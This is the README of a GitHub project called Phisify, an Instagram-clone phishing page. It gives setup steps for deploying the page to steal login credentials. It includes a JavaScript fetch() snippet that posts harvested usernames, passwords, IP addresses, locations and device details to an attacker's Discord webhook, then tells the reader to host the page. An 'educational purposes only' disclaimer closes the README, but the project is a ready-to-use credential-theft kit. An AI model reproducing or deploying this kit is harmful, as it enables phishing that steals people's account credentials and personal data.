![image](https://github.com/user-attachments/assets/9fd1268f-8067-4547-88c5-0cc8f0fa36d2)
# Phisify
Instagram clone phishing page with discord integration to fetch information and log them through discord webhooks.
# Setup
- Download this repo and extact the zip file
- After that edit the `script.js` file
  ```js
    try {
        const response = await fetch('YOUR_DISCORD_WEBHOOK_URL', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });
- Replace `YOUR_DISCORD_WEBHOOK_URL` with your discord `WEBHOOK_URL` to log all the phising data.
- After this, host your website and you're good to go! :D

# Logs The Following Data
- Username/Email
- Password
- Browser ( Name / Version )
- Operating System
- Device
- Screen
- IP Location
- IP Address
- ISP Information
- Language ( Browser )
- Platform
# Contact Me:
- **Instagram:** [volksgeistt](https://instagram.com/volksgeistt)
- **Web:** [volksgeistt.xyz](https://volksgeistt.xyz)
# ⚠️ This Repository is made for educational purposes only. The author is not responsible for any harm of future acts.
